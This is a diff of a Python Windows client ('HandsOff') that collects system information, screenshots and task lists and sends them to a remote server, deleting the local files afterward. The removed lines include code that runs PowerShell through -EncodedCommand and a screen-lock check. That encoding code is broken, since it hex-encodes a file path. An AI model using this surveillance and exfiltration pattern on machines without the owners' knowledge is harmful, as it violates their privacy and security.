@@ -18,7 +18,10 @@ import uuid
 import sys
 import os
 
-# Added sending boot time in welcome
+
+# TODO:
+#   1. Change datetime format to look like main - [V]
+#   2. Add a psutil.net_connections option
 
 
 class SystemInformation:
@@ -104,7 +107,6 @@ class SystemInformation:
         self.send_file_size()
         self.send_file_content()
         self.confirm()
-
         os.remove(self.si_full_path)
         sys.stdout.flush()
 
@@ -114,48 +116,11 @@ class Screenshot:
         self.ps_path = rf'{app_path}\screenshot.ps1'
         self.client = client
 
-        logIt_thread(log_path, msg='Calling get_date()...')
-        self.dt = get_date()
-
+        # d = datetime.now().replace(microsecond=0).strftime("%d-%b-%y %I.%M.%S %p")
         logIt_thread(log_path, msg='Defining screenshot file name...')
-        self.filename = rf"screenshot {self.client.hostname} {self.client.localIP} {self.dt}.jpg"
+        self.filename = rf"screenshot {self.client.hostname} {self.client.localIP} {get_date()}.jpg"
         self.file_path = os.path.join(app_path, self.filename)
         logIt_thread(log_path, msg=f'Screenshot file name: {self.filename}')
-
-    def execute_powershell_script(self):
-        logIt_thread(log_path, msg='Running make_script()...')
-        logIt_thread(log_path, msg=f'Writing script to {self.ps_path}...')
-        with open(self.ps_path, 'w') as file:
-            file.write("Add-Type -AssemblyName System.Windows.Forms\n")
-            file.write("Add-Type -AssemblyName System.Drawing\n\n")
-            file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
-            file.write("$Width  = $Screen.Width\n")
-            file.write("$Height = $Screen.Height\n")
-            file.write("$Left = $Screen.Left\n")
-            file.write("$Top = $Screen.Top\n\n")
-            file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
-            file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
-            file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
-            file.write(rf"$bitmap.Save('{self.file_path}')")
-
-        time.sleep(0.2)
-        # subprocess.Popen(["powershell.exe", rf"{self.ps_path}"], stdout=sys.stdout).communicate()
-        logIt_thread(log_path, msg=f'Writing script to {self.ps_path} completed.')
-
-    def run_powershell_script_in_memory(self):
-        # Convert the script to a byte array
-        btes = self.ps_path.encode("utf-16-le")
-
-        # Use the byte array to create an in-memory file
-        stream = "".join(format(b, "02x") for b in btes)
-
-        # Load the in-memory file into a PowerShell instance and execute it
-        process = subprocess.Popen(["powershell.exe", "-EncodedCommand", stream], stdout=subprocess.PIPE,
-                                   stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-
-        # Return the output of the script
-        return stdout.decode("utf-16-le")
 
     def run_script(self):
         logIt_thread(log_path, msg=f'Capturing screenshot...')
@@ -231,16 +196,9 @@ class Screenshot:
             logIt_thread(log_path, msg=f'Connection Error')
             return False
 
-    def is_locked(self) -> bool:
-        user32 = ctypes.WinDLL('user32.dll')
-        hWnd = user32.GetForegroundWindow()
-        length = user32.GetWindowTextLengthA(hWnd)
-        return length == 0
-
     def run(self):
         logIt_thread(log_path, msg='Calling run_script()...')
         self.run_script()
-
         logIt_thread(log_path, msg='Calling send_file()...')
         self.send_file()
         logIt_thread(log_path, msg='Calling confirm()...')
@@ -405,9 +363,9 @@ class Tasks:
         self.send_file_content()
         logIt_thread(log_path, msg=f'Calling confirm()...')
         self.confirm()
-
         logIt_thread(log_path, msg=f'Removing file: {self.task_path}...')
         os.remove(self.task_path)
+        sys.stdout.flush()
 
         try:
             self.client.soc.settimeout(10)
@@ -505,7 +463,7 @@ class Welcome:
     def get_boot_time(self):
         logIt_thread(log_path, msg='Fetching last restart time...')
         last_reboot = psutil.boot_time()
-        return datetime.fromtimestamp(last_reboot).replace(microsecond=0)
+        return datetime.fromtimestamp(last_reboot).strftime('%d/%b/%y %H:%M:%S')
 
     def confirm(self):
         try:
@@ -665,10 +623,6 @@ Catch {
                         self.client.soc.send('yes'.encode())
                         logIt_thread(log_path, msg=f'Send completed.')
 
-                        logIt_thread(log_path, msg='Sending client version to server...')
-                        self.client.soc.send(client_version.encode())
-                        logIt_thread(log_path, msg=f'Send completed.')
-
                     except (WindowsError, socket.error) as e:
                         logIt_thread(log_path, msg=f'{e}')
                         break
@@ -786,7 +740,7 @@ class Client:
 
 def get_date() -> str:
     d = datetime.now().replace(microsecond=0)
-    dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))
+    dt = str(d.strftime("%d-%b-%y %I.%M.%S %p"))
 
     return dt
 
@@ -883,7 +837,7 @@ def main():
 
 
 if __name__ == "__main__":
-    client_version = "1.0.1"
+    client_version = "1.0.0"
     app_path = r'c:\HandsOff'
     updater_file = rf'{app_path}\updater.exe'
     log_path = fr'{app_path}\client_log.txt'
